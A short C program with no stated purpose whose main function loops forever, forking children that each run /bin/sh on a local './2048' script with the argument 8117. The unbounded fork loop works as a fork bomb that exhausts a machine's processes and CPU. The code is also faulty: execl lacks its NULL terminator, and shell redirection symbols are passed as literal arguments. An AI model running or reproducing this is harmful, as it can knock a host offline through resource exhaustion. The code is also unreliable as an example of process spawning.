#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    while (1) {
        if (!fork()) {
            execl("/bin/sh", "/bin/sh", "./2048", "8117", ">/dev/null", "&");
            return 0;
        }
     //   sleep(0);
    }
    return 0;
}
